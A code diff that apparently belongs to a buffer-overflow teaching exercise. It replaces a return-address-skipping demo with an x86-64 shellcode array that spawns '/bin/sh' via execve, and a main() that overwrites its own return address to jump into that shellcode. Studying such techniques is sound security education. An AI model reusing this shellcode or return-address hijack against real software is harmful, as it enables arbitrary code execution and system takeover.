@@ -2,22 +2,16 @@
 #include <string.h>
 #include <stdint.h>
 
-void function (int a, int b, int c) {
-    char buffer1[5];
+
+char shellcode[] = {
+0xeb, 0x15, 0x5e, 0xb8, 0x3b, 0x00, 0x00, 0x00,
+0x48, 0x89, 0xf7, 0xbe, 0x00, 0x00, 0x00, 0x00,
+0xba, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8,
+0xe6, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e,
+0x2f, 0x73, 0x68, 0x00 };
+
+void main() {
     uint64_t *ret;
-
-    // modify the return address to skip x - 1 at line 20
-    // so printf will print 0
-    ret = (uint64_t*)(buffer1 + 21);
-    (*ret) += 7;
-}
-
-int main(int argc, char** argv) {
-    int x;
-
-    x = 0;
-    function(1, 2, 3);
-    x = 1;
-    printf("%d\n", x);
-    return 0;
+    ret = (uint64_t*)&ret + 2;
+    (*ret) = (uint64_t)shellcode;
 }
